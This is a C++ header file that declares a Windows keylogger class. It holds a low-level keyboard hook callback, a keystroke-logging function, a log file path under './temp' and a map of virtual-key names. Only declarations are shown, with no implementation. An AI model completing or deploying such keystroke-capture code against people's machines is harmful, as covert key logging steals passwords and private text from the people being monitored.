#pragma once

#include <iostream>
#include <Windows.h>
#include <thread>
#include <fstream>
#include <string>
#include <map>

static HHOOK keyHook;
static LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
static void makeKeyLog(int keyCode, int statusFlag);

static std::string savePath = "./temp/keyLog.txt";
static DWORD prevPID = 0;
static std::map<int, std::string> virtualKeyDict;


class keyLogger
{
public:
	keyLogger();
	void startHook();
private:
	void initializeKeyDict();

};